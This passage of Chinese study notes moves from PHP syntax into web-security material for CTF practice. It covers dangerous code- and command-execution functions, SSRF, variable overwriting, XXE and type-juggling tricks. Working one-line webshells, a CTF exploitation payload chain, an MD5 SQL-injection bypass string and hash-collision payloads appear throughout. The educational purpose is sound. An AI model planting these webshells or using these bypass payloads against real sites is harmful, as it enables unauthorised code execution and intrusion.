是包含元素 [1, 2, 3] 的数组，$b 是包含元素 [4, 5, 6] 的数组。通过展开运算符 ...，[...$a, ...$b] 表达式将会将两个数组的元素合并到一个新的数组中，得到结果 $result。 因此，$result 的值将是一个包含所有 $a 和 $b 元素的新数组 [1, 2, 3, 4, 5, 6]。 Into 函数 $array = [1, 2]; function foo(int $a, int $b) { echo $a; # =&gt; 1 echo $b; # =&gt; 2 } foo(...$array); 在这里，GPT解释是…$other代表other是可变参数，可以接受多个参数 Splat运算符 function foo($first, ...$other) { var_dump($first); # =&gt; a var_dump($other); # =&gt; ['b', 'c'] } foo('a', 'b', 'c'); // 或 function foo($first, string ...$other){} 匹配表达式 $age = 23; $result = match (true) { $age &gt;= 65 =&gt; 'senior', $age &gt;= 25 =&gt; 'adult', $age &gt;= 18 =&gt; 'young adult', default =&gt; 'kid', }; echo $result; # =&gt; young adult 返回类型 // 基本返回类型声明 function sum($a, $b): float {/*...*/} function get_item(): string {/*...*/} class C {} // 返回一个对象 function getC(): C { return new C; } 可空返回类型 // 在 PHP 7.1 中可用 function nullOrString(int $v) : ?string { return $v % 2 ? \"odd\" : null; } echo nullOrString(3); # =&gt; odd var_dump(nullOrString(4)); # =&gt; NULL 变量函数 function bar($arg = '') { echo \"In bar(); arg: '$arg'. \"; } $func = 'bar'; $func('test'); # =&gt; In bar(); arg: test 匿名函数 $greet = function($name) { printf(\"Hello %s\\r \", $name); }; $greet('World'); # =&gt; Hello World $greet('PHP'); # =&gt; Hello PHP 箭头函数 $y = 1; $fn1 = fn($x) =&gt; $x + $y; // 相当于按值使用 $y： $fn2 = function ($x) use ($y) { return $x + $y; }; echo $fn1(5); # =&gt; 6 echo $fn2(5); # =&gt; 6 Nullsafe 运算符 // 从 PHP 8.0.0 开始，这一行： $result = $repo?-&gt;getUser(5)?-&gt;name; // 相当于下面的代码： if (is_null($repo)) { $result = null; } else { $user = $result-&gt;getUser(5); if (is_null($user)) { $result = null; } else { $result = $user-&gt;name; } } PHP 超级全局变量 $_SERVER $_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。 以下实例中展示了如何使用$_SERVER中的元素: &lt;?php echo $_SERVER['PHP_SELF']; echo \"&lt;br&gt;\"; echo $_SERVER['SERVER_NAME']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_HOST']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_REFERER']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"&lt;br&gt;\"; echo $_SERVER['SCRIPT_NAME']; ?&gt; 0x02 PHP危险函数 先跟着现成的文章总结 代码执行函数 eval #传入的参数必须为PHP代码，需要以分号结尾。 #执行多行代码 eval(phpinfo()); eval($_POST['cmd']); assert #执行单行代码：与eval类似，字符串被 assert() 当做 PHP 代码来执行 assert($_POST['cmd']); eval与assert区别： 若给一个这样形式的一句话木马，该如何使用webshell进行连接呢&lt;?php $_POST['1']($_POST['2']); ?&gt; 如果想通过eval函数来完成一句话木马的话，不能直接1=eval&amp;2用这种格式连接，原因是eval是一个语言构造器而不是一个函数，不能被可变函数调用。 PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。这么看来eval其实并不能算是‘函数’，而是PHP自身的语言结构，如果需要用‘可变’的方式调用，需要自己构造，类似这样子的： &lt;?php function eval_1($str) { eval($str); } $a='eval_1'; $a('phpinfo()'); ?&gt; 所以我们需要借助其他命令执行函数如assert来实现，用1=assert(eval&amp;2)最终转换为php代码为assert(eval($_POST['2'])) 如图所示测试成功注意：测试时需要留意使用php的版本，若使用版本超过7.1则会连接失败。原因为 我们必须清楚一点，我们的eval函数中参数是字符，assert函数中参数为表达式 （或者为函数） preg_replace 这个有版本限制：php5.5版本上/e就被弃用 mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) 搜索subject中匹配pattern的部分， 以replacement进行替换。 preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码。（提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在包含 preg_replace() 的行中出现语法解析错误） 至于为什么我这里5.6都可以，是因为我在phpstorm中设置的语言级别是5.4 另外这里还需其他形式，这里稍微总结一下，日后再见到，就补充。 preg_replace('/(' . $re . ')/ei','strtolower(\"\\\\1\")',$str） 1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个 2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同 3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号 4、/s 与/m相对，单行模式匹配。 5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。 6、/x 忽略空白模式。 明白了/ei是什么，发现\\\\ 1又不知道是什么了 反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘ ’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 说人话就是，\\谁，就匹配第几个，如果对于如下代码 &lt;?php function test($str) {} echo preg_replace(\"/s*[php](.+?)[/php]s*/ies\", 'test(\"\\1\")', $_GET[\"h\"]); 提交 ?h=[php]phpinfo()[/php]，phpinfo()是不会被执行的，因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)'，此时phpinfo仅是被当做一个字符串参数了。 在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。 防御办法 将'test(\"\\1\")' 修改为\"test('\\1')\"，这样‘${phpinfo()}'就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。 举个CTF例子 &lt;?php $id = $_GET['id']; $_SESSION['id'] = $id; function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str ); } foreach($_GET as $re =&gt; $str) { echo complex($re, $str). \" \"; } function getFlag(){ @eval($_GET['cmd']); } foreach函数将参数和参数值分别给了$re和$str，$re作为正则表达式，$str作为要被替换的字符串。要执行上面的漏洞，要正则表达式和字符串匹配起来，于是，playload查看phpinfo ?\\S*=${phpinfo()} 解释一下：\\S意思为匹配所有的字符，一定要是大写S，大小写是有区别的 [\\s]---表示，只要出现空白就匹配； [\\S]---表示，非空白就匹配； 后面的值是个变量，能让漏洞执行这个变量，这个再强调一次，只有在双引号包裹的字符串中才可以解析变量，单引号不行 payload如下： ?\\S*=${getFlag()}&amp;cmd=show_source('/flag'); ?\\S*=${getFlag()}&amp;cmd=eval($_POST[pass]);--蚁剑 ?\\S*=${$_POST[pass]}--POST传参 create_funcion create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。 string create_function(string $args , string $code ) $args 变量部分 $code 方法代码部分（要执行的代码） &lt;?php $func = create_function(\"\", $_POST['cmd']); $func(); ?&gt; array_map array_map()函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致。 array_map( callable $callback, array $array1[, array $…] ) : array array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 &lt;?php $func = $_GET['func']; $cmd = $_GET['cmd']; $array[0] = $cmd; $new_array = array_map($func, $array); ?&gt; call_user_func call_user_func 把第一个参数作为回调函数调用,其余参数是回调函数的参数。 &lt;?php @call_user_func(assert, $_GET['cmd']); ?&gt; call_user_func_array call_user_func_array把第一个参数作为回调函数（callback）调用，并把一个数组参数作为回调函数的参数 &lt;?php $array[0] = $_GET['cmd']; @call_user_func_array(assert, $array); ?&gt; array_filter array_filter( array $array[, callable $callback[, int $flag = 0]] ) : array 依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。 &lt;?php $array[0] = $_GET['cmd']; $func = $_GET['func']; array(array_filter($array, $func)); ?&gt; usort与uasort usort() 通过用户自定义的比较函数对数组进行排序。 uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 php&gt;=5.6：变长参数是PHP5.6新引入的特性，在PHP中可以使用 func(…$arr)这样的方式，将$arr数组展开成多个参数，传入func函数。 &lt;?php //uasort(...$_GET); usort(...$_GET); ?&gt; php版本随意 &lt;?php //uasort(...$_GET); usort($_GET, 'assert'); ?&gt; 文件操作函数 file_put_contents() 函数把一个字符串写入文件中。 fputs() 函数写入文件 &lt;?php $test = '&lt;?php eval($_POST[1]);?&gt;'; file_put_contents(\"shell.php\", $test); ?&gt; &lt;?php fputs(fopen('shell.php', 'w'), '&lt;?php eval($_POST[1]);?&gt;'); ?&gt; 动态函数 PHP函数直接由字符串拼接 &lt;?php $_GET['a']($_GET['b']); ?&gt; “${@phpinfo()}” &lt;?php //echo \"${phpinfo()}\"; echo \"{${phpinfo()}}\"; ?&gt; 单引号不可以（花括号中语句前要加个@ ，不然不行）（@ 空格 tab 注释符 + -等符号都可以，就是不能直接写代码） 命令执行函数 exec function exec(string $command,array[optional] $output,int[optional] $return_value) php代码： &lt;?php exec('ipconfig', $v); print_r($v); ?&gt; 知识点： exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。 这里遇到了print、echo、print_r打印函数，问问GPT的区别 放几个例子 $message = \"Hello, World!\"; print $message; // 输出：Hello, World! $name = \"John\"; $age = 25; echo \"My name is \", $name, \" and I am \", $age, \" years old.\"; // 输出：My name is John and I am 25 years old. $cars = array(\"BMW\", \"Toyota\", \"Honda\"); print_r($cars); /* 输出： Array ( [0] =&gt; BMW [1] =&gt; Toyota [2] =&gt; Honda ) */ print： print 用于将字符串输出到标准输出（通常是浏览器或命令行）。 print 只能打印字符串类型的数据，对于其他数据类型会尝试将其转换为字符串。 print 在使用时可以省略括号，例如 print \"Hello, World!\";。 echo： echo 用于将一个或多个字符串或表达式输出到标准输出。 echo 没有返回值，它会在输出时直接将内容发送到标准输出。 echo 可以打印各种数据类型的值，包括字符串、数字、布尔值和数组等。 print_r： print_r 是一个函数，可以传递一个变量作为参数。 print_r 用于以易读的方式输出变量的信息，通常用于调试和打印复杂的数据结构（如数组和对象）。 print_r 会递归地遍历数组和对象，并打印它们的键和值，以及其他信息（如类型、长度等）。 print_r 的输出结果更加详细和可读，适合用于开发和调试目的。 总的来说：print 和 echo 更适合简单的字符串输出，而 print_r 则更适合打印复杂的数据结构。选择使用哪个函数取决于你的具体需求和输出内容的类型。 passthru function passthru(string $command,int[optional] $return_value) &lt;?php passthru('ipconfig'); ?&gt; 知识点： passthru与system的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。 system function system(string $command,int[optional] $return_value) &lt;?php system('ipconfig'); ?&gt; system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。 反撇号`和shell_exec shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体 &lt;?php echo shell_exec('ipconfig'); echo (`ipconfig`); ?&gt; popen函数打开进程 上面的方法只能简单地执行命令，却不能与命令交互。但有些时候必须向命令输入一些东西，如在增加Linux的系统用户时，要调用su来把当前用户换到root才行，而su命令必须要在命令行上输入root的密码。这种情况下，用上面提到的方法显然是不行的。 resource popen ( string $command , string $mode ) 函数需要两个参数，一个是执行的命令command，另外一个是指针文件的连接模式mode，有r和w代表读和写。 函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。 popen()打开一个指向进程的管道，该进程由派生给定的command命令执行而产生。 返回一个和fopen()所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用pclose()来关闭。 此指针可以用于fgets()，fgetss()和 fwrite() &lt;?php popen('ipconfig &gt;&gt; ./ip.txt', 'r'); ?&gt; &lt;?php $test=\"ls /tmp/test\"; $fp = popen($test, \"r\"); while(!feof($fp)){ $out = fgets($fp, 4096); echo $out; } pclose($fp); ?&gt; 上述代码是一个简单的 PHP 脚本，用于执行系统命令并读取其输出。 以下是对代码的详细解释： 1. `$test = \"ls /tmp/test\";`：定义一个字符串变量 `$test`，存储要执行的系统命令。在这个例子中，命令是 `ls /tmp/test`，它将列出 `/tmp/test` 目录中的文件和文件夹。 2. `$fp = popen($test, \"r\");`：使用 `popen()` 函数打开一个管道，并执行给定的命令。`$test` 是要执行的命令，`\"r\"` 表示以只读模式打开管道。`popen()` 函数会返回一个文件指针，用于后续读取命令的输出。 3. `while(!feof($fp)){...}`：使用 `while` 循环读取管道中的输出。`feof($fp)` 函数在文件指针到达文件末尾时返回 `true`，因此 `while(!feof($fp))` 表达式将在文件指针未到达文件末尾时执行循环体。 4. `$out = fgets($fp, 4096);`：使用 `fgets()` 函数从管道中读取一行数据，并将其存储在变量 `$out` 中。`$fp` 是文件指针，`4096` 是每次读取的最大字节数。 5. `echo $out;`：将读取的行数据输出到标准输出。 6. `pclose($fp);`：关闭打开的管道，释放相关资源。 通过上述代码，系统命令 `ls /tmp/test` 的输出将被逐行读取并输出到标准输出。这样，你可以在 PHP 脚本中执行命令并处理其输出。请注意，执行系统命令需要谨慎，确保命令的来源和执行环境的安全性。 proc_open 与Popen函数类似，但是可以提供双向管道 pcntl_exec path是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚。 args是一个要传递给程序的参数的字符串数组。 pcntl是linux下的一个扩展，需要额外安装，可以支持 php 的多线程操作。 pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0 SSRF file_get_contents 直接用file_get_contents()加载url指向文件 &lt;?php if (isset($_POST['url'])){ $content = file_get_contents($_POST['url']); $filename = './images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; } echo $img; ?&gt; 另外这个函数也可以配合PHP伪协议进行利用，比如：php://input fsockopen fsockopen函数会使用socket跟服务器建立tcp连接，传输原始数据 &lt;?php function GetFile($host, $port, $link){ $fp = fsockopen($host. intval($port), $errno, $errstr, 30); if(!$fp){ echo \"$errno (error number $errno) \"; } else{ $out = \"GET $link HTTP/1.1\\r \"; $out .= \"HOST: $host\\r \"; $out .= \"Connection: Close\\r \\r \"; $out .= \"\\r \"; fwrite($fp, $out); $contents = ''; while(!feof($fp)){ $contents .= fgets($fp, 1024); } fclose($fp); return $contents; } } ?&gt; curl_exec &lt;?php if(isset($_POST['url'])){ $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj, CURLOPT_URL, $link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result = curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result; } ?&gt; 变量覆盖 $$ &lt;?php foreach (array('_COOKIE', '_POST', '_GET') as $_request){ foreach ($$_request as $_key =&gt; $_value){ $$_key = addslashes($_value); echo $_key.\" \"; echo $$_key.\" \"; } } ?&gt; 以上代码，可以用从COOKIE、POST、GET获得的 ‘参数=值’，来覆盖之前的所有变量 register_globals php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。 注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。 当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞： &lt;?php echo \"Register_globals: \" . (int)ini_get(\"register_globals\") . \"&lt;br/&gt;\"; if ($a) { echo \"Hacked!\"; } ?&gt; 通过GET和POST方式输入变量a的值（不好搭环境，直接cv了）： 当然，也可以从COOKIE中输入： extratct extract(array,extract_rules,prefix) extract函数从数组中将变量导入到当前的符号表。 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 该函数返回成功设置的变量数目。 array必需。规定要使用的数组。 extract_rules可选。extract函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。 可能的值：EXTR_OVERWRITE ——默认。如果有冲突，则覆盖已有的变量。 &lt;?php $a = 1; $b = array('a'=&gt;'3'); extract($b); echo $a; //输出为3 ?&gt; parse_str parse_str(string, array) parse_str函数把查询字符串解析到变量中。注释:如果未设置array参数，由该函数设置的变量将覆盖已存在的同名变量。 parse_str函数的作用就是解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量 string必需。规定要解析的字符串。 array可选。规定存储变量的数组名称。该参数指示变量存储到数组中。 &lt;?php $a = 1; parse_str('a=2'); print_r($a);//输出为2 ?&gt; mb_parse_str mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似： &lt;?php $a = 'oop'; mb_parse_str($_SERVER[\"QUERY_STRING\"]); if ($a == 'mi1k7ea') { echo \"Hacked!\"; } else { echo \"Hello!\"; } ?&gt; import_request_variables bool import_request_variables(string $types[string$prefix] ) import_request_variables将 GET/POST/Cookie变量导入到全局作用域中; import_request_variables函数就是把GET、POST、COOKIE的参数注册成变量，用在register. globals被禁止的时候 $type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀 这个函数我在测试的时候，说是PHP 5.3之后已经弃用，在PHP 5.4之后移出——看来基本不会遇见了 &lt;?php $auth = '0'; import_request_variables('G'); if($auth = 1){ echo \"private!\"; } else { echo \"public!\"; } //输入：www.xxx.com?auth=1 //输出：private ?&gt; XXE simplexml_load_string 实例： 闪灵s-cms（这里我直接cv了 看到IF语句这边是需要满足两个条件：$signature 不等于空、$echostr 等于空。通过全局搜索可以知道了 $signature 是一个超全局变量 signature，$echostr也是 我们可以控制simplexml_load_string的内容，所以存在XXE，可以读取任意文件： 显然还有其他函数，日后遇到继续总结 PHP特性 in_array 在判断之前自动做类型转换（跟着CTF里的知识学习） 这里可以很容易理解出，如果上传的文件名是1-24中的一个，那么就将文件进行上传。下面是in_array()函数的定义。 in_array ：(PHP 4, PHP 5, PHP 7) 功能 ：检查数组中是否存在某个值 定义 ： bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) 在 $haystack 中搜索 $needle ，如果第三个参数 $strict 的值为 TRUE ，则 in_array() 函数会进行强检查，检查 $needle 的类型是否和 $haystack 中的相同。如果找到 $haystack ，则返回 TRUE，否则返回 FALSE。 上面的代码可以看到，第三个参数没有设置，那就默认是false，也就是弱检查，相当于PHP弱比较== 那我们只需要构造文件名7shell.php，这时in_array在判断的时候，会将7shell.php强转为7，而7肯定在range(1,24)中，最终就能绕过造成任意文件上传。（这里之所以会发生强制类型转换，是因为目标数组中的元素为数字类型) tips：这个也与array_search相同，也可以用数组绕过 is_numeric PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。任何参数做16进制编码传入，会直接通过(true)：16进制会被判断为数字 tips：%00即空格会被判断为非数字–&gt;即直接跳过检测了 比如下图的代码 要求密码不能为数字，但又得等于404，构造password=404%00——即可绕过 首先404%00被认为404 （这里有空格）判断为非数字，绕过检测，在下面又因为是弱比较，它被转为404，达到相等条件。 switch 如果switch是数字类型的case的判断时，Switch会将其中的参数转换为int类型 &lt;?php $index = \"2abc\"; switch ($index) { case 0: echo \"it is 0\"; case 1: echo \"it is 1\"; case 2: echo \"it is 2\";//输出it is 2 break; case 3: echo \"it is 3\"; default: echo \"no, you are a fw\"; md5、sha1 0e开头的全部相等 （==判断）——MD5和sha1一样 md5('QNKCDZO') == md5(240610708)//true //MD5加密后会变成这个样子 0e830400451993494058024219903391 == 0e462097431906509019562988736854 由于0e开头的字符串会转换为0，所以真正比较的过程会变成这样0 == 0 常用的MD5加密后以0E开头的有 #0e开头的md5和原值： QNKCDZO 0e830400451993494058024219903391 240610708 0e462097431906509019562988736854 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 双 md5： $md5 md5($md5) 0e00275209979 0e551387587965716321018342879905 0e00506035745 0e224441551631909369101555335043 0e00540451811 0e057099852684304412663796608095 0e00678205148 0e934049274119262631743072394111 0e00741250258 0e899567782965109269932883593603 0e00928251504 0e148856674729228041723861799600 0e01350016114 0e769018222125751782256460324867 0e01352028862 0e388419153010508575572061606161 0e01392313004 0e793314107039222217518920037885 0e01875552079 0e780449305367629893512581736357 0e01975903983 0e317084484960342086618161584202 0e02042356163 0e335912055437180460060141819624 0e02218562930 0e151492820470888772364059321579 0e02451355147 0e866503534356013079241759641492 0e02739970294 0e894318228115677783240047043017 0e02760920150 0e413159393756646578537635311046 0e02784726287 0e433955189140949269100965859496 0e03298616350 0e851613188370453906408258609284 0e03393034171 0e077847024281996293485700020358 利用数组绕过 （===判断）：md5不能加密数组，传入数组会报错，但会继续执行并且返回结果为null——MD5和sha1一样 md5(a[]=1) === md5(b[]=1) //true //null === null sql注入——md5（第二个参数被设置为 true） &lt;?php $password=$_POST['password']; $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\"; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0){ echo 'flag is :'.$flag; } else{ echo '密码错误!'; } 第二个参数设置为 true 时， MD5 报文摘要将以16字节长度的原始二进制格式返回 ?password=ffifdyop ，sql 语句转换为 SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt; 同样 129581926211651571912466741651878684928 md5 后为 T0Do#'or'8 ffifdyop的MD5加密结果是 276f722736c95d99e921722cf9ed621c 经过MySQL编码后会变成'or'6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密 md5、sha1强碰撞绕过——这种情况是在强比较的情况下，加了string（强转）——一般bp抓包才可 md5强碰撞例子 psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2 与 psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 还有 M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 与 M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 似乎还有 param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 shal强碰撞例子 %25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1 与 %25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 $md5 == md5($md5)，0e+数字 md5 爆破脚本： #!/usr/bin/env python import hashlib import re prefix = '0e' def breakit(): iters = 0 while 1: s = prefix + str(iters) hashed_s = hashlib.md5(s).hexdigest() iters = iters + 1 r = re.match('^0e[0-9]{30}', hashed_s) if r: print \"[+] found! md5( {} ) ---&gt; {}\".format(s, hashed_s) print \"[+] in {} iterations\".format(iters) exit(0) if iters % 1000000 == 0: print \"[+] current value: {} {} iterations, continue...\".format(s, iters) breakit() PHP 版本： &lt;?php for($i=0;;$i++) if(\"0e{$i}\"==md5(\"0e{$i}\")) die (\"[+] found! 0e{$i}\"); elseif ($i % 1000000 === 0) echo \"[+] current value: {$i} \"; 处理 INF： var_dump(md5('INF')); //9517fd0bf8faa655990a4dffe358e13e var_dump(md5(9e999999));//9e999999即INF //9517fd0bf8faa655990a4dffe358e13e 即可满足 md5($this-&gt;trick1) === md5($this-&gt;trick2) 绕过原理：NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至NAN=NAN都是false，但md5(‘NAN’)=md5(‘NAN’)为true。（ &lt;?php//INF同理 var_dump(md5('NAN') == md5('NAN')); $a = NAN; $b = NAN; var_dump($a == $b); //输出bool(true) //bool(false) ?&gt; 处理 0.1*0.1： 0.1*0.1 实际上由于浮点数处理的原因，数值为 0.010000000000000002 猜测 md5 函数处理时对小数的部分进行了舍弃，所以 var_dump(md5(0.01)); //04817efd11c15364a6ec239780038862 var_dump(md5(0.1*0.1)); //04817efd11c15364a6ec239780038862 